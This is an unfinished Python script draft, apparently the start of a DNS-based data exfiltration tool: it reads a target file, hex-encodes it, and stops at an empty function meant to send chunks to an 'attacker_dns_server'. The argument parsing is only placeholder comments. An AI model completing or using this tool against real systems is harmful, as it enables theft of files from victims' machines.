!#/usr/bin/python 

import argparse
import subprocess 

#argparser.argparse blah blah 
#arg -p --path, required=true blah blah
#arg -t --target, required=true blah blah 
#arg -

#Read target file, and encode contents in hexadecimal
def read_and_encode_file(file_path):
  with open(file_path, 'rb') as file:
    file_content = file.read()
    hex_encoded = file_content.hex()
  return hex_encoded 
#Split encoded data into chunks
def send_chunks(encoded_data, chunk_size, attacker_dns_server, domain):
  
